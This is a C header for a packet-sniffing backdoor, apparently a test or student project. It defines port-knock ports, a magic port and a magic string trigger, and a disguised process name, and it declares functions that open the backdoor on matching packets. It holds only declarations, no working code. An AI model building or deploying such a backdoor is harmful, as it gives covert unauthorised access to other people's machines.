#ifndef BACKDOOR_UTILS_H
#define BACKDOOR_UTILS_H

// #define PORT_KNOCK_LIST // used to determine how to open backdoor
#define MAGIC_PORT_STRING

#define CDR_NOISE_COMMAND "noi"
#define CDR_PORTS { 20000,40000,00 }
#define	CDR_BPF_PORT "port "
#define CDR_BPF_ORCON " or "
#define CDR_INTERFACE "wlp41s0"
#define CAPLENGTH	98
#define ETHLENGTH 	14
#define IP_MIN_LENGTH 	20
#define MAGIC_PORT 40000
#define MAGIC_STRING "thisisatest"
#define MAGIC_STRING_LEN 11

#define DEBUG

struct iphdr;
struct tcphdr;

void create_deamon_process(char *cdr_noise_command);

void cdr_open_door();

void open_backdoor_via_port_list(unsigned int cports[], int cportcnt, int *actport, struct tcphdr *tcp);

void open_backdoor_via_magic_bytes(struct tcphdr *tcp, struct iphdr *ip);

char *set_port_knock_list_filter(unsigned int cports[], int cportcnt);

char *set_magic_string_filter();

#endif